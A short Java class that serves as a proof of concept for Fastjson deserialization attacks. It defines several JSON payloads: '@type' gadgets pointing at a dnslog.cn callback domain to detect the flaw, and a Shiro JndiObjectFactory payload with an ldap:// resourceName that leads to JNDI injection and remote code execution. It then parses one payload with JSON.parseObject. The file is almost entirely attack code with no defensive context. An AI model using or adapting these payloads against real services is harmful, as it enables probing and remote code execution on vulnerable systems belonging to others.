package tmp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class fastj {
    public static void main(String[] args) {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{" +
                "  \"@type\": \"java.net.Inet4Address\"," +
                "  \"val\": \"hlk8zu.dnslog.cn\"" +
                "}";
        String poc03 = "{\"val\": \"hlk8zu.dnslog.cn\", \"@type\": \"java.net.Inet4Address\"}";
        String poc2 = "{\"@type\": \"org.apache.shiro.jndi.JndiObjectFactory\", \"resourceName\": \"ldap://127.0.0.1:50389/8e9b69\"}";
        JSON.parseObject(poc);
    }
}
